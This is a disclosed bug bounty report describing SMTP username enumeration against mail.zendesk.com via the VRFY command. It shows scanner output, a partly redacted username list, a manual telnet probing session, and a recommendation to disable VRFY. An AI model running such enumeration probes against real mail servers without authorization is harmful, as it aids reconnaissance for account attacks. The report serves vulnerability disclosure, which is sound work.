# SMTP user enumeration via mail.zendesk.com

## Report Details
- **Report ID**: 193314
- **URL**: https://hackerone.com/reports/193314
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-12-22T08:40:44.150Z
- **Disclosed**: 2019-10-25T20:04:13.133Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zendesk

## Vulnerability Information
Several methods exist that can be used to ██████████ SMTP to enumerate valid usernames and addresses; namely VRFY, EXPN, and RCPT TO. `mail.zendesk.com` does not reply to `EXPN` or `RCPT TO` so we will concentrate on `VRFY` in this report.

The VRFY command will request that the receiving SMTP server verify that a given email username is valid. The SMTP server will reply with the login name of the user. This feature can be turned off in sendmail, because allowing it can be a security hole. VRFY commands can be used to probe for login names on a system.

An example of this using VRFY is given below, where this list of users

```
admin
█████████
███
support
████
████████
security
test
test________________________1
```

is enumerated:

```
 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... names.txt
Target count ............. 1
Username count ........... 9
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Thu Dec 22 08:29:37 2016 #########
mail.zendesk.com: ███████ exists
mail.zendesk.com: ██████ exists
mail.zendesk.com: █████████ exists
mail.zendesk.com: ██████ exists
mail.zendesk.com: ███
######## Scan completed at Thu Dec 22 08:29:38 2016 #########
5 results.

9 queries in 1 seconds (9.0 queries / sec)
```

This can also be manually verified:

```
███:~$ telnet mail.zendesk.com 25
Trying 192.161.153.1...
Connected to mail.zendesk.com.
Escape character is '^]'.
220 █████████ ESMTP
VRFY █████
252 2.0.0 ███████
VRFY test___________________1
550 5.1.1 <test___________________1>: Recipient address rejected: User unknown in local recipient table
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

The `252 2.0.0 █████` message indicates success, while the `550 5.1.1` message indicates failure when the username does not exist on this server. 

**Mitigation**
Disable the `VRFY` command in your SMTP server configuration.

## Attachments
No attachments
